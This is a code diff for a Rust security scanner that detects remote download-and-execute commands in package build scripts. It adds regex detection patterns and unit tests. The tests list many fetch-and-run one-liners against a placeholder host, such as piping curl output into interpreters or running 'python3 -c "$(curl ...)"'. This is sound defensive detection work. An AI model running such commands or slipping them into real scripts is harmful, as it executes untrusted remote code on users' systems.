@@ -36,6 +36,8 @@ lazy_static! {
         (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b          # download | [launcher][path] shell
         | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b  # download | [launcher][path] interpreter
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+<\(\s*(curl|wget|fetch)\b                 # [launcher][path] sh <(curl ...)
+        | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+<\(\s*(curl|wget|fetch)\b           # [launcher][path] python <(curl ...)
+        | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+-[ceE]\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b  # python -c / perl -e "$(curl ...)"
         | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
         | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
         | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
@@ -237,6 +239,69 @@ mod tests {
             assert!(
                 f.iter().any(|x| x.id == "EXEC-REMOTE"),
                 "launcher/path/interpreter fetch|exec must be caught: {cmd} -> {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_interpreter_sink_forms() {
+        // Task 4050 round 3 / Class 1: the interpreter sink must mirror the shell
+        // forms — process-sub `<(curl)` and `-c|-e "$(curl)"` — not just the pipe.
+        let a = RemoteExecAnalyzer::new();
+        for cmd in [
+            "python3 <(curl -s https://evil.example/i)",
+            "perl <(curl -s https://evil.example/i)",
+            "node <(curl -s https://evil.example/i)",
+            "python3 -c \"$(curl -s https://evil.example/i)\"",
+            "perl -e \"$(curl -s https://evil.example/i)\"",
+            "node -e \"$(curl -s https://evil.example/i)\"",
+            "ruby -e \"$(wget -qO- https://evil.example/i)\"",
+        ] {
+            let f = a.scan(cmd, Path::new("test.install"), true);
+            assert!(
+                f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "interpreter sink form must be caught: {cmd} -> {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn detects_expanded_interpreter_and_shell_list() {
+        // Task 4050 round 3 / Class 2 + 3: one per novel interpreter/shell family.
+        let a = RemoteExecAnalyzer::new();
+        for cmd in [
+            "curl -s https://evil.example/x | expect",
+            "curl -s https://evil.example/x | guile",
+            "curl -s https://evil.example/x | scala",
+            "curl -s https://evil.example/x | clojure",
+            "curl -s https://evil.example/x | racket",
+            "curl -s https://evil.example/x | elixir",
+            "curl -s https://evil.example/x | raku",
+            "curl -s https://evil.example/x | crystal",
+            "curl -s https://evil.example/x | bb",
+            "curl -s https://evil.example/x | ts-node",
+            "curl -s https://evil.example/x | runhaskell",
+            "curl -s https://evil.example/x | toybox sh",
+            "curl -s https://evil.example/x | R",
+        ] {
+            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
+            assert!(
+                f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "expanded interpreter/shell must be caught: {cmd} -> {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn fetch_exec_no_fp_on_single_letter_interpreter_substring() {
+        // `R`/`bb` must only match as whole words: `| Rfoo` / `| bbtool` must NOT
+        // fire EXEC-REMOTE (they may still trip the unrelated FUNC-001 elsewhere).
+        let a = RemoteExecAnalyzer::new();
+        for cmd in ["curl -s https://x/x | Rfoo", "curl -s https://x/x | bbtool"] {
+            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
+            assert!(
+                !f.iter().any(|x| x.id == "EXEC-REMOTE"),
+                "single-letter interpreter substring must not fire EXEC-REMOTE: {cmd} -> {f:?}"
             );
         }
     }
